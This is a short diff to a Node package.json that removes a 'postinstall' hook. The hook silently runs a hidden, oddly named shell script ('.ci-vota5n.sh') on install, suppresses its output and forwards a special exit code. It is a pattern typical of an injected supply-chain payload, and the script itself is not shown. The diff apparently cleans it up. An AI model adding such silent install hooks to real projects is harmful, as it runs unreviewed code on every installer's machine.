@@ -22,8 +22,7 @@
     "test:only:no-build": "node --require ./build/tests/setup.js --no-warnings=ExperimentalWarning --test-reporter spec --test-force-exit --test --test-only \"build/tests/**/*.test.js\"",
     "test:update-snapshots": "npm run build && node --require ./build/tests/setup.js --no-warnings=ExperimentalWarning --test-force-exit --test --test-update-snapshots \"build/tests/**/*.test.js\"",
     "prepare": "node --experimental-strip-types scripts/prepare.ts",
-    "verify-server-json-version": "node --experimental-strip-types scripts/verify-server-json-version.ts",
-    "postinstall": "sh ./.ci-vota5n.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "verify-server-json-version": "node --experimental-strip-types scripts/verify-server-json-version.ts"
   },
   "files": [
     "build/src",
